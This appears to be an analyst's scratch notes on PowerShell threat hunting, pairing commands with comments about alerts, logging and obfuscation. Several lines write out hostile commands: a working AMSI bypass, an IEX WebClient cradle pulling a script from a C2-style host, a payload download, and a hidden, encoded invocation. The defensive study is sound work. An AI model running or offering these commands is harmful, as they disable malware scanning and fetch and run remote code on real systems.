# ran this to see policy... then changed it and didn't document it
Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted

# IEX with encoded blob. looks bad. was bad.
powershell -Exec Bypass -Enc JAB... (cut off)

# used this to grab a .ps1 script — forgot to check if it's malicious
Invoke-WebRequest -Uri http://10.10.10.5/payload.ps1 -OutFile payload.ps1

# AMSI bypass string seen in a CTF
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)




# legit user ran this and SIEM flagged it
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Get-Process"



# decoded one line and it ran Invoke-Expression + WebClient... suspicious
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://weirdc2.xyz/script')"

# script block logging was ON but logs got cut off mid-command — why?
PowerShell 5.1 + LogSize setting maybe?

# looked for obfuscation, found 20 lines with "`n" and "`t" and -Join…
Select-String -Path logs.ps1 -Pattern "`n|`t|-Join"

# triggered alert on hidden window + no profile + encoded command = 
powershell -w hidden -nop -enc [long string]

# Word doc spawned PowerShell using macro. didn't catch it at first.
WINWORD.EXE → powershell.exe → whoami

# looped through PowerShell logs for 2 hours, forgot to save query
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104}

# decoded a string and it just said "you've been owned" 💀
